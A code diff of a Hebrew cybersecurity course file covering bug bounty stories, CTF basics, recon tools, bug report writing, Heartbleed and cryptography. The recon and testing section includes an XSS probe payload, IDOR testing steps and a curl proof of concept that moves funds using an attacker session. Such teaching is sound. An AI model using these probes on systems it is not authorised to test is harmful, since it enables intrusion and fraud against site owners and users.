@@ -10,15 +10,22 @@ export const chapters106to110 = [
         type: "story",
         title: "בן 19 שמצא באג ב-Apple וקיבל $50,000",
         content: `<div dir="rtl">
-<p><strong>הכול התחיל ממגרש משחקים דיגיטלי</strong></p>
-
-<p>Santiago Lopez היה בן 19 מארגנטינה כשהפך לאדם הראשון בהיסטוריה של <code>HackerOne</code> שהרוויח מיליון דולר ממציאת באגים. לא תואר באוניברסיטה. לא ניסיון תעסוקתי. רק מחשב נייד ועקשנות.</p>
+<div class="scenario-box scenario-story">
+  <p><strong>תרחיש:</strong> Santiago Lopez היה בן 19 מארגנטינה כשהפך לאדם הראשון בהיסטוריה של <code>HackerOne</code> שהרוויח מיליון דולר ממציאת באגים. לא תואר באוניברסיטה. לא ניסיון תעסוקתי. רק מחשב נייד ועקשנות.</p>
+</div>
 
 <p>באותה תקופה, Sam Curry וצוות חברים החליטו לחקור את <code>Apple</code> בצורה שיטתית. הם סרקו את כל ה-<code>subdomains</code> של <code>apple.com</code> ומצאו <code>subdomain</code> שמריץ מופע ישן של תוכנה שנרכשה ב-2002.</p>
 
-<p>מה שמצאו שם? חולשת <code>SQL Injection</code> שהובילה ל-<code>Remote Code Execution</code> מלא על שרת של Apple. משם הגיעו לרשת הפנימית.</p>
+<div class="attack-chain">
+  <div class="attack-step"><div class="attack-step-content"><strong>סריקת Subdomains</strong><p>מיפוי שיטתי של כל ה-subdomains של apple.com</p></div></div>
+  <div class="attack-step"><div class="attack-step-content"><strong>גילוי מופע ישן</strong><p>שרת עם תוכנה מ-2002 שלא עודכנה</p></div></div>
+  <div class="attack-step"><div class="attack-step-content"><strong>SQL Injection</strong><p>חולשה קלאסית שהובילה ל-RCE מלא</p></div></div>
+  <div class="attack-step"><div class="attack-step-content"><strong>גישה לרשת הפנימית</strong><p>מהשרת הפגיע — חדירה לרשת Apple</p></div></div>
+</div>
 
 <div class="key-point"><strong>התוצאה:</strong> 55 חולשות, 11 קריטיות, $289,000 מ-Apple. דוח אחד בלבד שילם $50,000. Sam פרסם writeup מפורט שהפך ויראלי, וכיום הוא עובד full-time על Bug Bounty.</div>
+
+<div class="stat-highlight"><span class="stat-number">$50K</span><span class="stat-unit">על דוח בודד</span></div>
 
 <p>איך הם למדו את הכל? התשובה: <code>CTF</code> ו-<code>HackTheBox</code>. אותם "משחקים" שנראים כמו בילוי ערב הם בית הספר הטוב ביותר לסייבר.</p>
 
@@ -33,16 +40,15 @@ export const chapters106to110 = [
 
 <p>תחרות שבה פותרים אתגרי אבטחת מידע. המטרה: למצוא <code>flag</code> — מחרוזת מיוחדת (כמו <code>flag{y0u_f0und_m3}</code>) שמוכיחה שפתרת את האתגר.</p>
 
-<p>תחשבו על זה כמו חדר בריחה — רק דיגיטלי, ובמקום מנעולים פיזיים, אתם פורצים הצפנות, מנצלים חולשות בקוד, ומנתחים זיכרון.</p>
+<div class="info-box"><strong>ℹ️ מידע:</strong> תחשבו על זה כמו חדר בריחה — רק דיגיטלי, ובמקום מנעולים פיזיים, אתם פורצים הצפנות, מנצלים חולשות בקוד, ומנתחים זיכרון.</div>
 
 <p><strong>שלושה סוגי תחרויות CTF:</strong></p>
 
-<table class="content-table">
-  <tr><th>סוג</th><th>איך זה עובד</th><th>למי מתאים</th></tr>
-  <tr><td><strong>Jeopardy</strong></td><td>אתגרים בקטגוריות (Web, Crypto, Forensics). כל אתגר = נקודות. הקשה יותר = יותר נקודות</td><td>מתחילים ומתקדמים</td></tr>
-  <tr><td><strong>Attack-Defense</strong></td><td>כל קבוצה מקבלת שרת עם שירותים פגיעים. תקפו את היריבים תוך הגנה על השרת שלכם</td><td>צוותים מנוסים</td></tr>
-  <tr><td><strong>King of the Hill</strong></td><td>שרת אחד משותף. מי ששולט בו הכי הרבה זמן — מנצח</td><td>מי שאוהב כאוס</td></tr>
-</table>
+<div class="mini-cards">
+  <div class="mini-card"><div class="mini-card-icon">🧩</div><div class="mini-card-title">Jeopardy</div><div class="mini-card-desc">אתגרים בקטגוריות (Web, Crypto, Forensics). כל אתגר = נקודות. הקשה יותר = יותר נקודות. מתאים למתחילים ומתקדמים</div></div>
+  <div class="mini-card"><div class="mini-card-icon">⚔️</div><div class="mini-card-title">Attack-Defense</div><div class="mini-card-desc">כל קבוצה מקבלת שרת עם שירותים פגיעים. תקפו את היריבים תוך הגנה על השרת שלכם. לצוותים מנוסים</div></div>
+  <div class="mini-card"><div class="mini-card-icon">👑</div><div class="mini-card-title">King of the Hill</div><div class="mini-card-desc">שרת אחד משותף. מי ששולט בו הכי הרבה זמן — מנצח. למי שאוהב כאוס</div></div>
+</div>
 
 <p><strong>קטגוריות נפוצות ב-Jeopardy CTF:</strong></p>
 
@@ -63,9 +69,9 @@ export const chapters106to110 = [
         type: "demo",
         title: "אתגר CTF — פתרון צעד אחר צעד",
         content: `<div dir="rtl">
-<p><strong>בואו נפתור אתגר Web בסיסי ביחד</strong></p>
-
-<p>קיבלתם קישור לאתר עם דף התחברות. האתגר: מצאו את ה-flag.</p>
+<div class="scenario-box scenario-hack">
+  <p><strong>תרחיש:</strong> קיבלתם קישור לאתר עם דף התחברות. האתגר: מצאו את ה-flag.</p>
+</div>
 
 <p><strong>שלב 1: בדיקת קוד המקור</strong></p>
 
@@ -97,16 +103,17 @@ echo "ZmxhZ3tpbnNwZWN0X2V2ZXJ5dGhpbmchfQ==" | base64 -d
 # תוצאה:
 flag{inspect_everything!}</code></pre></div>
 
-<div class="key-point"><strong>מה למדנו:</strong> אתגרי CTF מלמדים אותך לחשוב כמו תוקף — לבדוק כל פינה, לחפש הערות נשכחות, קבצי גיבוי חשופים, וקידודים שניתן לפענח. אלה בדיוק הטכניקות שמשמשות ב-Bug Bounty אמיתי.</div>
+<div class="success-box"><strong>✅ הצלחה:</strong> מצאנו את ה-flag! אתגרי CTF מלמדים לחשוב כמו תוקף — לבדוק כל פינה, לחפש הערות נשכחות, קבצי גיבוי חשופים, וקידודים שניתן לפענח. אלה בדיוק הטכניקות שמשמשות ב-Bug Bounty אמיתי.</div>
 
 <p><strong>פלטפורמות לתרגול (חינם!):</strong></p>
-<ul>
-<li><strong><code>PicoCTF</code></strong> — מושלם למתחילים. אתגרים מודרכים</li>
-<li><strong><code>TryHackMe</code></strong> — learning paths עם הסברים</li>
-<li><strong><code>HackTheBox</code></strong> — מכונות לפריצה. הכי פופולרי</li>
-<li><strong><code>PortSwigger Web Academy</code></strong> — labs לחולשות Web (חינם)</li>
-<li><strong><code>CTFtime.org</code></strong> — לוח תחרויות עולמי</li>
-</ul>
+
+<div class="mini-cards">
+  <div class="mini-card"><div class="mini-card-icon">🏁</div><div class="mini-card-title">PicoCTF</div><div class="mini-card-desc">מושלם למתחילים. אתגרים מודרכים</div></div>
+  <div class="mini-card"><div class="mini-card-icon">🎓</div><div class="mini-card-title">TryHackMe</div><div class="mini-card-desc">learning paths עם הסברים</div></div>
+  <div class="mini-card"><div class="mini-card-icon">📦</div><div class="mini-card-title">HackTheBox</div><div class="mini-card-desc">מכונות לפריצה. הכי פופולרי</div></div>
+  <div class="mini-card"><div class="mini-card-icon">🌐</div><div class="mini-card-title">PortSwigger Academy</div><div class="mini-card-desc">labs לחולשות Web (חינם)</div></div>
+  <div class="mini-card"><div class="mini-card-icon">🏆</div><div class="mini-card-title">CTFtime.org</div><div class="mini-card-desc">לוח תחרויות עולמי</div></div>
+</div>
 </div>`
       },
       {
@@ -117,26 +124,25 @@ flag{inspect_everything!}</code></pre></div>
 
 <p>חברות טכנולוגיה מזמינות האקרים לחפש חולשות במוצרים שלהן — ומשלמות על כל חולשה שמתגלה. זו לא פריצה בלתי חוקית — זה הסכם רשמי שנקרא <code>Responsible Disclosure</code>.</p>
 
-<p>התעשייה שווה מעל 1.5 מיליארד דולר בשנה, ומי שטוב בזה יכול להרוויח יותר ממהנדס תוכנה בכיר.</p>
+<div class="stat-highlight"><span class="stat-number">$1.5B</span><span class="stat-unit">שווי תעשיית Bug Bounty בשנה</span></div>
 
 <p><strong>הפלטפורמות הגדולות:</strong></p>
 
-<table class="content-table">
-  <tr><th>פלטפורמה</th><th>לקוחות בולטים</th><th>טווח תשלומים</th></tr>
-  <tr><td><code>HackerOne</code></td><td>Google, Apple, Microsoft, US DoD</td><td>$100 - $100,000+</td></tr>
-  <tr><td><code>Bugcrowd</code></td><td>Tesla, Mastercard, Atlassian</td><td>$50 - $50,000</td></tr>
-  <tr><td><code>Intigriti</code></td><td>חברות אירופיות, NATO</td><td>$100 - $20,000</td></tr>
-  <tr><td><code>Synack</code></td><td>הזמנה בלבד, US Gov</td><td>גבוה מאוד</td></tr>
-</table>
+<div class="mini-cards">
+  <div class="mini-card"><div class="mini-card-icon">🟢</div><div class="mini-card-title">HackerOne</div><div class="mini-card-desc">Google, Apple, Microsoft, US DoD — $100 עד $100,000+</div></div>
+  <div class="mini-card"><div class="mini-card-icon">🔵</div><div class="mini-card-title">Bugcrowd</div><div class="mini-card-desc">Tesla, Mastercard, Atlassian — $50 עד $50,000</div></div>
+  <div class="mini-card"><div class="mini-card-icon">🟣</div><div class="mini-card-title">Intigriti</div><div class="mini-card-desc">חברות אירופיות, NATO — $100 עד $20,000</div></div>
+  <div class="mini-card"><div class="mini-card-icon">🔴</div><div class="mini-card-title">Synack</div><div class="mini-card-desc">הזמנה בלבד, US Gov — תשלום גבוה מאוד</div></div>
+</div>
 
 <p><strong>כמה משלמים לפי חומרה?</strong></p>
 
 <table class="content-table">
   <tr><th>חומרה</th><th>דוגמאות</th><th>תשלום טיפוסי</th></tr>
-  <tr><td><strong>Critical</strong></td><td><code>RCE</code>, <code>Auth Bypass</code>, גישה ל-DB שלם</td><td>$5,000 - $100,000+</td></tr>
-  <tr><td><strong>High</strong></td><td><code>SQLi</code>, <code>SSRF</code>, <code>IDOR</code> עם דליפת מידע רגיש</td><td>$1,000 - $10,000</td></tr>
-  <tr><td><strong>Medium</strong></td><td><code>Stored XSS</code>, <code>CSRF</code>, חשיפת מידע</td><td>$100 - $1,000</td></tr>
-  <tr><td><strong>Low</strong></td><td>חשיפת headers, מידע לא רגיש</td><td>$50 - $200</td></tr>
+  <tr><td><span class="phase-badge phase-red">Critical</span></td><td><code>RCE</code>, <code>Auth Bypass</code>, גישה ל-DB שלם</td><td>$5,000 - $100,000+</td></tr>
+  <tr><td><span class="phase-badge phase-red">High</span></td><td><code>SQLi</code>, <code>SSRF</code>, <code>IDOR</code> עם דליפת מידע רגיש</td><td>$1,000 - $10,000</td></tr>
+  <tr><td><span class="phase-badge phase-gold">Medium</span></td><td><code>Stored XSS</code>, <code>CSRF</code>, חשיפת מידע</td><td>$100 - $1,000</td></tr>
+  <tr><td><span class="phase-badge phase-blue">Low</span></td><td>חשיפת headers, מידע לא רגיש</td><td>$50 - $200</td></tr>
 </table>
 
 <div class="warning-box"><strong>חשוב:</strong> תמיד בדקו את ה-<code>Scope</code> לפני שמתחילים. בדיקה של דומיין שלא ב-scope יכולה להיחשב כפריצה בלתי חוקית, גם אם הכוונה הייתה טובה.</div>
@@ -148,9 +154,9 @@ flag{inspect_everything!}</code></pre></div>
         content: `<div dir="rtl">
 <p><strong>השלבים בציד באגים אמיתי</strong></p>
 
-<p>כל ציד מתחיל ב-<code>Reconnaissance</code> — מיפוי שטח ההתקפה. ככל שתמפו יותר — תמצאו יותר.</p>
+<div class="info-box"><strong>ℹ️ מידע:</strong> כל ציד מתחיל ב-<code>Reconnaissance</code> — מיפוי שטח ההתקפה. ככל שתמפו יותר — תמצאו יותר.</div>
 
-<p><strong>שלב 1: Recon — מיפוי הנכסים</strong></p>
+<p><strong>שלב 1: <span class="phase-badge phase-gold">Recon</span> — מיפוי הנכסים</strong></p>
 
 <div class="code-preview"><pre><code># מציאת subdomains
 subfinder -d target.com -o subs.txt
@@ -163,7 +169,7 @@ nmap -sV -T4 -p- target.com
 ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/common.txt
 # מצא: /admin, /backup, /.git, /api/docs</code></pre></div>
 
-<p><strong>שלב 2: בדיקת חולשות</strong></p>
+<p><strong>שלב 2: <span class="phase-badge phase-red">Attack</span> — בדיקת חולשות</strong></p>
 
 <div class="code-preview"><pre><code># בדיקת IDOR (Insecure Direct Object Reference)
 # אם URL מכיל: /api/user/profile?id=1234
@@ -178,13 +184,13 @@ ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/common.txt
 # שדה תגובה: &lt;img src=x onerror=alert(1)&gt;
 # אם pop-up קופץ = XSS!</code></pre></div>
 
-<p><strong>שלב 3: תיעוד ו-PoC</strong></p>
+<p><strong>שלב 3: <span class="phase-badge phase-blue">Analysis</span> — תיעוד ו-PoC</strong></p>
 
 <div class="code-preview"><pre><code># כתיבת Proof of Concept
 # 1. צילומי מסך של כל שלב
 # 2. curl commands שניתן לשחזר:
-curl -X POST https://target.com/api/transfer \
-  -H "Cookie: session=ATTACKER_SESSION" \
+curl -X POST https://target.com/api/transfer \\
+  -H "Cookie: session=ATTACKER_SESSION" \\
   -d "to=attacker&amount=1000&from=victim_id"
 # 3. הסבר ברור של ה-Impact</code></pre></div>
 
@@ -211,6 +217,11 @@ curl -X POST https://target.com/api/transfer \
   <tr><td><strong>Impact</strong></td><td>מה תוקף יכול לעשות בפועל</td><td>Attacker can read PII of all 2M users</td></tr>
   <tr><td><strong>Remediation</strong></td><td>הצעה לתיקון</td><td>Validate user ID matches authenticated session</td></tr>
 </table>
+
+<div class="vs-container">
+  <div class="vs-card vs-bad"><h4>❌ דוח שנדחה</h4><p>"מצאתי XSS באתר שלכם. תתקנו."</p><p>אין steps, אין PoC, אין impact. נדחה.</p></div>
+  <div class="vs-card vs-good"><h4>✅ דוח שמשלם</h4><p>Title, Severity, Steps to Reproduce מדויקים, curl command, screenshot, impact analysis, הצעת תיקון.</p></div>
+</div>
 
 <div class="warning-box"><strong>טעויות נפוצות שגורמות לדחייה:</strong> דוח בלי Steps to Reproduce ברורים, דוח שמתאר חולשה תיאורטית בלי PoC, דוח על משהו שמחוץ ל-Scope, או דוח כפול (Duplicate) — מישהו כבר דיווח על זה לפניכם.</div>
 
@@ -259,15 +270,21 @@ curl -X POST https://target.com/api/transfer \
         type: "story",
         title: "Heartbleed — הבאג שחשף חצי מהאינטרנט",
         content: `<div dir="rtl">
-<p><strong>אפריל 2014. חוקר אבטחה ב-Google מגלה שמשהו מאוד, מאוד לא בסדר.</strong></p>
+<div class="scenario-box scenario-alert">
+  <p><strong>תרחיש:</strong> אפריל 2014. חוקר אבטחה ב-Google מגלה שמשהו מאוד, מאוד לא בסדר.</p>
+</div>
 
 <p>Neel Mehta עבד על קוד של <code>OpenSSL</code> — הספרייה שמפעילה <code>HTTPS</code> על 66% מהאינטרנט. הוא מצא באג שגרם לו להחוויר: שרתים מדליפים זיכרון לכל מי שמבקש.</p>
 
-<p>הבאג היה בתכונה קטנה שנקראת <code>Heartbeat</code>: הלקוח שולח הודעה קצרה, והשרת מחזיר אותה כאישור שהחיבור חי. אבל אף אחד לא בדק שהגודל שהלקוח ביקש תואם לגודל ההודעה בפועל.</p>
+<div class="attack-chain">
+  <div class="attack-step"><div class="attack-step-content"><strong>Heartbeat Request</strong><p>הלקוח שולח הודעה קצרה של 1 בייט</p></div></div>
+  <div class="attack-step"><div class="attack-step-content"><strong>שקר בגודל</strong><p>מבקש תגובה של 64KB — פי 65,536 מהגודל האמיתי</p></div></div>
+  <div class="attack-step"><div class="attack-step-content"><strong>דליפת זיכרון</strong><p>השרת מחזיר 64KB מהזיכרון — מפתחות SSL, סיסמאות, נתוני משתמשים</p></div></div>
+</div>
 
-<p><strong>המשמעות:</strong> תוקף שולח <code>Heartbeat</code> של 1 בייט, אבל מבקש תגובה של 64KB. השרת מחזיר 64KB מהזיכרון — כולל מפתחות SSL, סיסמאות, ונתונים של משתמשים אחרים.</p>
+<div class="stat-highlight"><span class="stat-number">500,000</span><span class="stat-unit">שרתים פגיעים — 17% מכלל שרתי HTTPS</span></div>
 
-<div class="warning-box"><strong>ההיקף:</strong> Yahoo, AWS, Cisco, Android 4.1 — כולם היו פגיעים. 500,000 שרתים, 17% מכלל שרתי ה-HTTPS בעולם. תוקף יכול היה לחלץ את ה-Private Key ולפענח את כל התקשורת.</div>
+<div class="warning-box"><strong>ההיקף:</strong> Yahoo, AWS, Cisco, Android 4.1 — כולם היו פגיעים. תוקף יכול היה לחלץ את ה-Private Key ולפענח את כל התקשורת.</div>
 
 <p>הבאג קיבל את השם <code>Heartbleed</code>, לוגו משלו, ואתר ייעודי. הוא שינה את עולם הסייבר: הוכח שהאינטרנט בנוי על קוד open-source שנכתב על ידי מתנדבים — וצריך מימון מקצועי.</p>
 
@@ -284,7 +301,7 @@ curl -X POST https://target.com/api/transfer \
 
 <p><strong>AES — Advanced Encryption Standard</strong></p>
 
-<p>אומץ ב-2001 על ידי <code>NIST</code> לאחר תחרות עולמית של 5 שנים. היום הוא בכל מקום: <code>WhatsApp</code>, <code>BitLocker</code>, <code>WPA2</code>, כל אתר <code>HTTPS</code>.</p>
+<div class="info-box"><strong>ℹ️ מידע:</strong> אומץ ב-2001 על ידי <code>NIST</code> לאחר תחרות עולמית של 5 שנים. היום הוא בכל מקום: <code>WhatsApp</code>, <code>BitLocker</code>, <code>WPA2</code>, כל אתר <code>HTTPS</code>.</div>
 
 <table class="content-table">
   <tr><th>גרסה</th><th>אורך מפתח</th><th>סיבובים</th><th>שימוש</th></tr>
@@ -292,7 +309,10 @@ curl -X POST https://target.com/api/transfer \
   <tr><td><code>AES-256</code></td><td>256 ביט</td><td>14</td><td>סיווג Top Secret בממשל ארה"ב</td></tr>
 </table>
 
-<p><strong>Mode חשוב:</strong> אל תשתמשו ב-<code>ECB</code> — הוא מצפין כל בלוק בנפרד וחושף דפוסים חוזרים. השתמשו ב-<code>GCM</code> (Galois/Counter Mode) שנותן גם הצפנה וגם אימות שלמות.</p>
+<div class="vs-container">
+  <div class="vs-card vs-bad"><h4>❌ ECB Mode</h4><p>מצפין כל בלוק בנפרד — חושף דפוסים חוזרים. אותו plaintext = אותו ciphertext. לעולם אל תשתמשו!</p></div>
+  <div class="vs-card vs-good"><h4>✅ GCM Mode</h4><p>Galois/Counter Mode — נותן גם הצפנה וגם אימות שלמות. התקן המומלץ היום.</p></div>
+</div>
 
 <div class="key-point"><strong>נקודת מפתח:</strong> הצפנה סימטרית היא מהירה מאוד — מתאימה להצפנת כמויות גדולות של מידע. הבעיה: איך שני צדדים מסכימים על מפתח משותף בלי שמישהו מצותת? בדיוק בשביל זה קיימת הצפנה אסימטרית.</div>
 </div>`
@@ -303,21 +323,18 @@ curl -X POST https://target.com/api/transfer \
         content: `<div dir="rtl">
 <p><strong>האנלוגיה של תיבת הדואר</strong></p>
 
-<p>דמיינו תיבת דואר עם חריץ: כל אחד יכול להכניס מכתב (Public Key), אבל רק מי שיש לו את המפתח יכול לפתוח ולקרוא (Private Key).</p>
+<p>דמיינו תיבת דואר עם חריץ: כל אחד יכול להכניס מכתב (<span class="phase-badge phase-green">Public Key</span>), אבל רק מי שיש לו את המפתח יכול לפתוח ולקרוא (<span class="phase-badge phase-red">Private Key</span>).</p>
 
 <p>זו הצפנה אסימטרית: שני מפתחות שונים מתמטית קשורים. מה שהוצפן ב-Public Key ניתן לפענוח רק ב-Private Key, ולהפך.</p>
 
 <p><strong>RSA — האלגוריתם שבנה את האינטרנט</strong></p>
 
-<p>פותח ב-1977 על ידי Rivest, Shamir ו-Adleman. מבוסס על עיקרון מתמטי פשוט: קל לכפול שני מספרים ראשוניים גדולים, אבל קשה מאוד לפרק את התוצאה חזרה לגורמים.</p>
+<div class="info-box"><strong>ℹ️ מידע:</strong> פותח ב-1977 על ידי Rivest, Shamir ו-Adleman. מבוסס על עיקרון מתמטי פשוט: קל לכפול שני מספרים ראשוניים גדולים, אבל קשה מאוד לפרק את התוצאה חזרה לגורמים.</div>
 
-<table class="content-table">
-  <tr><th>מאפיין</th><th>סימטרי (AES)</th><th>אסימטרי (RSA)</th></tr>
-  <tr><td>מפתחות</td><td>אחד משותף</td><td>זוג: Public + Private</td></tr>
-  <tr><td>מהירות</td><td>מהיר מאוד</td><td>איטי פי 1000</td></tr>
-  <tr><td>שימוש עיקרי</td><td>הצפנת נתונים</td><td>החלפת מפתחות, חתימות דיגיטליות</td></tr>
-  <tr><td>אורך מפתח</td><td>128-256 ביט</td><td>2048-4096 ביט</td></tr>
-</table>
+<div class="vs-container">
+  <div class="vs-card vs-bad"><h4>סימטרי (AES)</h4><p>מפתח אחד משותף. מהיר מאוד. 128-256 ביט. שימוש: הצפנת נתונים.</p></div>
+  <div class="vs-card vs-good"><h4>אסימטרי (RSA)</h4><p>זוג: Public + Private. איטי פי 1000. 2048-4096 ביט. שימוש: החלפת מפתחות, חתימות דיגיטליות.</p></div>
+</div>
 
 <div class="key-point"><strong>נקודת מפתח:</strong> בפועל, משתמשים בשניהם ביחד. RSA מחליף מפתח AES בצורה בטוחה, ואז AES מצפין את כל הנתונים במהירות. זה בדיוק מה שקורה ב-HTTPS.</div>
 </div>`
@@ -346,11 +363,11 @@ openssl genrsa -out private.pem 2048
 openssl rsa -in private.pem -pubout -out public.pem
 
 # הצפנה עם Public Key
-openssl rsautl -encrypt -pubin -inkey public.pem \
+openssl rsautl -encrypt -pubin -inkey public.pem \\
   -in message.txt -out encrypted.bin
 
 # פענוח עם Private Key
-openssl rsautl -decrypt -inkey private.pem \
+openssl rsautl -decrypt -inkey private.pem \\
   -in encrypted.bin -out decrypted.txt</code></pre></div>
 
 <p><strong>3. Hash — טביעת אצבע של מידע:</strong></p>
@@ -366,7 +383,7 @@ echo -n "Hello world" | openssl dgst -sha256
 # MD5 (לא בטוח! רק להדגמה)
 echo -n "Hello World" | openssl dgst -md5</code></pre></div>
 
-<div class="demo-note"><strong>נסו בעצמכם:</strong> פתחו טרמינל והריצו את הפקודות. שימו לב ל-Avalanche Effect: שינוי של ביט אחד בקלט משנה כ-50% מהפלט. זו תכונה קריטית של hash functions טובות.</div>
+<div class="success-box"><strong>✅ נסו בעצמכם:</strong> פתחו טרמינל והריצו את הפקודות. שימו לב ל-Avalanche Effect: שינוי של ביט אחד בקלט משנה כ-50% מהפלט. זו תכונה קריטית של hash functions טובות.</div>
 </div>`
       },
       {
@@ -379,10 +396,10 @@ echo -n "Hello World" | openssl dgst -md5</code></pre></div>
 
 <table class="content-table">
   <tr><th>אלגוריתם</th><th>אורך פלט</th><th>סטטוס</th><th>שימוש</th></tr>
-  <tr><td><code>MD5</code></td><td>128 ביט</td><td>שבור! נמצאו התנגשויות</td><td>checksums בלבד</td></tr>
-  <tr><td><code>SHA-1</code></td><td>160 ביט</td><td>שבור! Google הדגימה התנגשות ב-2017</td><td>לא לשימוש חדש</td></tr>
-  <tr><td><code>SHA-256</code></td><td>256 ביט</td><td>בטוח</td><td>Bitcoin, TLS, חתימות</td></tr>
-  <tr><td><code>bcrypt</code></td><td>184 ביט</td><td>בטוח + איטי בכוונה</td><td>אחסון סיסמאות</td></tr>
+  <tr><td><code>MD5</code></td><td>128 ביט</td><td><span class="phase-badge phase-red">שבור!</span> נמצאו התנגשויות</td><td>checksums בלבד</td></tr>
+  <tr><td><code>SHA-1</code></td><td>160 ביט</td><td><span class="phase-badge phase-red">שבור!</span> Google הדגימה התנגשות ב-2017</td><td>לא לשימוש חדש</td></tr>
+  <tr><td><code>SHA-256</code></td><td>256 ביט</td><td><span class="phase-badge phase-green">בטוח</span></td><td>Bitcoin, TLS, חתימות</td></tr>
+  <tr><td><code>bcrypt</code></td><td>184 ביט</td><td><span class="phase-badge phase-green">בטוח + איטי בכוונה</span></td><td>אחסון סיסמאות</td></tr>
 </table>
 
 <p><strong>למה <code>bcrypt</code> עדיף לסיסמאות?</strong></p>
@@ -391,8 +408,7 @@ echo -n "Hello World" | openssl dgst -md5</code></pre></div>
 
 <div class="warning-box"><strong>אזהרה:</strong> לעולם אל תאחסנו סיסמאות כ-plain text או כ-MD5/SHA-256 רגיל. השתמשו ב-<code>bcrypt</code>, <code>scrypt</code>, או <code>Argon2</code> עם salt ייחודי לכל סיסמה.</div>
 
-<p><strong>מה זה Salt?</strong></p>
-<p>מחרוזת אקראית שמתווספת לסיסמה לפני ה-hash. בלי salt, שתי סיסמאות זהות ייצרו hash זהה — ותוקף יכול להשתמש ב-Rainbow Table (טבלה מוכנה מראש). עם salt ייחודי, כל hash שונה גם אם הסיסמה אותו דבר.</p>
+<div class="info-box"><strong>ℹ️ מה זה Salt?</strong> מחרוזת אקראית שמתווספת לסיסמה לפני ה-hash. בלי salt, שתי סיסמאות זהות ייצרו hash זהה — ותוקף יכול להשתמש ב-Rainbow Table (טבלה מוכנה מראש). עם salt ייחודי, כל hash שונה גם אם הסיסמה אותו דבר.</div>
 </div>`
       },
       {
@@ -401,24 +417,17 @@ echo -n "Hello World" | openssl dgst -md5</code></pre></div>
         content: `<div dir="rtl">
 <p><strong>כל פעם שאתם רואים מנעול בדפדפן, הריקוד הזה קורה תוך מילי-שניות:</strong></p>
 
-<p><strong>שלב 1: Client Hello</strong></p>
-<p>הדפדפן שולח לשרת: "שלום, אני תומך ב-TLS 1.3, אלה אלגוריתמי ההצפנה שאני מכיר."</p>
-
-<p><strong>שלב 2: Server Hello + Certificate</strong></p>
-<p>השרת עונה: "מעולה, בואו נשתמש ב-AES-256-GCM. הנה התעודה שלי עם ה-Public Key, חתומה על ידי <code>Certificate Authority</code>."</p>
-
-<p><strong>שלב 3: אימות התעודה</strong></p>
-<p>הדפדפן בודק: האם ה-CA מוכר? האם התעודה בתוקף? האם שם הדומיין מתאים? אם משהו לא בסדר — אזהרה אדומה.</p>
-
-<p><strong>שלב 4: החלפת מפתח</strong></p>
-<p>הדפדפן יוצר <code>Pre-Master Secret</code>, מצפין אותו עם ה-Public Key של השרת, ושולח. רק השרת יכול לפענח עם ה-Private Key שלו.</p>
-
-<p><strong>שלב 5: תקשורת מוצפנת</strong></p>
-<p>שני הצדדים גוזרים מפתח <code>AES</code> משותף מה-Pre-Master Secret. מרגע זה, כל התקשורת מוצפנת סימטרית — מהיר ובטוח.</p>
+<div class="incident-timeline">
+  <div class="timeline-event"><div class="timeline-dot dot-red"></div><div class="timeline-time">שלב 1</div><div class="timeline-desc"><strong>Client Hello</strong> — הדפדפן שולח לשרת: "שלום, אני תומך ב-TLS 1.3, אלה אלגוריתמי ההצפנה שאני מכיר."</div></div>
+  <div class="timeline-event"><div class="timeline-dot dot-red"></div><div class="timeline-time">שלב 2</div><div class="timeline-desc"><strong>Server Hello + Certificate</strong> — השרת עונה: "מעולה, בואו נשתמש ב-AES-256-GCM. הנה התעודה שלי עם ה-Public Key, חתומה על ידי <code>Certificate Authority</code>."</div></div>
+  <div class="timeline-event"><div class="timeline-dot dot-red"></div><div class="timeline-time">שלב 3</div><div class="timeline-desc"><strong>אימות התעודה</strong> — הדפדפן בודק: האם ה-CA מוכר? האם התעודה בתוקף? האם שם הדומיין מתאים? אם משהו לא בסדר — אזהרה אדומה.</div></div>
+  <div class="timeline-event"><div class="timeline-dot dot-red"></div><div class="timeline-time">שלב 4</div><div class="timeline-desc"><strong>החלפת מפתח</strong> — הדפדפן יוצר <code>Pre-Master Secret</code>, מצפין אותו עם ה-Public Key של השרת, ושולח. רק השרת יכול לפענח עם ה-Private Key שלו.</div></div>
+  <div class="timeline-event"><div class="timeline-dot dot-red"></div><div class="timeline-time">שלב 5</div><div class="timeline-desc"><strong>תקשורת מוצפנת</strong> — שני הצדדים גוזרים מפתח <code>AES</code> משותף מה-Pre-Master Secret. מרגע זה, כל התקשורת מוצפנת סימטרית — מהיר ובטוח.</div></div>
+</div>
 
 <div class="key-point"><strong>נקודת מפתח:</strong> שימו לב לאלגנטיות: RSA (איטי) משמש רק פעם אחת כדי להעביר מפתח. AES (מהיר) מצפין את כל השאר. זה השילוב שמפעיל את כל האינטרנט המאובטח.</div>
 
-<p><strong><code>TLS 1.3</code></strong> (2018) שיפר את התהליך: פחות צעדים (1-RTT), חייב <code>Perfect Forward Secrecy</code>, והסיר אלגוריתמים חלשים. אם שרת נפרץ מחר — תקשורת של אתמול עדיין בטוחה.</p>
+<div class="success-box"><strong>✅ TLS 1.3</strong> (2018) שיפר את התהליך: פחות צעדים (1-RTT), חייב <code>Perfect Forward Secrecy</code>, והסיר אלגוריתמים חלשים. אם שרת נפרץ מחר — תקשורת של אתמול עדיין בטוחה.</div>
 </div>`
       },
       {
@@ -427,14 +436,11 @@ echo -n "Hello World" | openssl dgst -md5</code></pre></div>
         content: `<div dir="rtl">
 <p><strong>הצפנה לא נמצאת רק בשיעורי מדעי המחשב — היא בכל מקום</strong></p>
 
-<p><strong>WhatsApp — End-to-End Encryption</strong></p>
-<p>כל הודעה מוצפנת במכשיר השולח ומפוענחת רק במכשיר המקבל. WhatsApp עצמה לא יכולה לקרוא את ההודעות. הפרוטוקול (<code>Signal Protocol</code>) משתמש ב-<code>Double Ratchet</code>: המפתחות משתנים כל הודעה. גם אם מפתח אחד נחשף — רק הודעה אחת בסכנה.</p>
-
-<p><strong>Bitcoin — קריפטוגרפיה ככסף</strong></p>
-<p>כל ארנק הוא זוג מפתחות. ה-Public Key הוא הכתובת, ה-Private Key מאפשר לבצע עסקאות. <code>SHA-256</code> משמש ל-mining ולאימות בלוקים. אם מאבדים את ה-Private Key — הכסף אבד לנצח.</p>
-
-<p><strong>אחסון סיסמאות</strong></p>
-<p>שירות אחראי לא שומר את הסיסמה שלכם — רק את ה-hash שלה (עם <code>bcrypt</code> + salt). כשאתם מתחברים, המערכת עושה hash לסיסמה שהקלדתם ומשווה. גם אם ה-DB נגנב — הסיסמאות לא חשופות.</p>
+<div class="mini-cards">
